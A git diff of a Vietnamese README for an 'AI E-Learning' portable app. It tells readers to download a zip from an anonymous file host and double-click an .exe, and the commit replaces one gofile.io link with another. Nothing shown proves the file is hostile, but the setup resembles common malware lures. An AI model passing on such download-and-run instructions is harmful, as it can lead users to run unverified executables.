@@ -38,7 +38,7 @@ Tài liệu giáo trình đã được biên dịch và đóng gói hoàn chỉn
 **Hướng dẫn:** Bạn tải file `.zip` cực nhẹ về, **giải nén** và nhấp đúp vào file `AI E-Learning.exe` (có biểu tượng bộ não sáng xanh) là thư viện điện tử sẽ lập tức mở ra mà không cần cài đặt!
 
 <p align="center">
-  <a href="https://gofile.io/d/V9e73r" target="_blank">
+  <a href="https://gofile.io/d/tgtTOc" target="_blank">
     <img src="https://img.shields.io/badge/Tải_Xuống_Ngay-AI__Edu__Bản__Portable__.zip (%7E171MB)-28a745?style=for-the-badge&logo=windows&logoColor=white" alt="Download ZIP" />
   </a>
 </p>
